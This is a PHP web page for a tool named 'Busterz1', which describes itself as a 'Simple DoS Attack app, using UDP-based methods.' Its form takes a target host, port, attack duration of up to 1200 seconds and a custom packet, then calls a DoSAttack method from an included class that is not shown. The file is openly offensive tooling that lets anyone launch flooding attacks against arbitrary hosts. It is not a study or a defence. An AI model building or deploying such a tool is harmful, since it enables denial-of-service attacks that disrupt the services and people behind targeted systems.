<?php
define('priv', TRUE);
require './inc/busterz1.class.php';

if(isset($_POST['h'])&&isset($_POST['p'])&&isset($_POST['t'])&&isset($_POST['pkt'])){
	$busterz1 = new Busterz1;
	$out = $busterz1->DoSAttack($_POST['h'], $_POST['p'], $_POST['t'], $_POST['pkt']);
}
?>
<html lang="en">
	<head>
		<title>Example &mdash; Busterz1</title>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
		<meta name="author" content="Busterz"/>
		<meta name="description" content="Simple DoS Attack app, using UDP-based methods."/>
		<link rel="icon" type="image/x-icon" href="img/favicon.ico?1"/>
		<link rel="stylesheet" type="text/css" href="css/style.css"/>
	</head>
	<body>
		<center>
			<?php
if(isset($out)){
	echo '<fieldset class="fs-output">
	<legend class="ld-output">Output</legend>
	'.$out.'
</fieldset><br />';
}
			?>
			<fieldset class="fs-input">
				<legend class="ld-input">DoS Attack</legend>
				<form method="post">
					<input type="text" name="h" placeholder="Host"/> : 
					<input type="number" name="p" min="1" max="65535" value="80"/><br />
					<input type="number" name="t" min="1" max="1200" value="10"/> seconds<br />
					<textarea name="pkt" placeholder="Craft your own packet (!rand! for random string)" rows="10" cols="50"></textarea><br />
					<input type="submit" value="Send"/>
				</form>
			</fieldset>
		</center>
		<div style="position: absolute; bottom: 0px; left: 2px; color: #00FF00;"><small>&copy; <strong>Busterz</strong> 2018</small></div>
	</body>
</body>